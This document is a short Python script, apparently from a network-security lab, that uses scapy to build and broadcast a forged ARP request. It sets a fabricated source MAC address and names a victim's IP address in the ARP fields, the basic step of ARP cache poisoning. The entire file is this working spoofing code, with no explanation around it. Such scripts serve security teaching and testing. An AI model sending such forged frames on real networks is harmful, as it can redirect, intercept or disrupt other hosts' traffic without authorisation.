#!/usr/bin/env python3
from scapy.all import *

IP_V = "10.9.0.5"
MAC_V_real = "02:42:0a:09:00:05"
IP_T = "10.9.0.6"
MAC_T_fake ="02:42:0a:09:00:69"

ether = Ether(src = MAC_T_fake , dst = "ff:ff:ff:ff:ff:ff")
arp = ARP(psrc = IP_V, hwsrc = MAC_V_real , pdst = IP_T)
arp.op = 1
frame = ether/arp
sendp(frame)
